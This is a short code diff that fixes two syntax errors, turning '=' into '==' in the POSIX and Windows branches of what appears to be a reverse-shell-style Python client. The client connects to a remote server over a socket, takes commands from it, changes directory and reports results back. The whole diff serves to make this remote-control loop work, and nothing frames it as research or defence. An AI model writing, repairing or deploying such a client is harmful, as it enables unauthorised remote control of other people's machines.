@@ -12,7 +12,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         print("Unable to connect to the server.")
     while True:
         message = s.recv(4096).decode('utf-8')
-        if os.name = 'posix':
+        if os.name == 'posix':
             if message[:3] == 'cd ':
                 os.chdir(message[3:])
                 s.send(f"Directory changed successfully.\n".encode('utf-8'))
@@ -30,7 +30,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 else:
                     print("Packet not received.")
                     break
-        elif os.name = 'nt':
+        elif os.name == 'nt':
             if message[:3] == 'cd ':
                 os.chdir(message[3:])
                 s.send(f"Directory changed successfully.\n".encode('utf-8'))
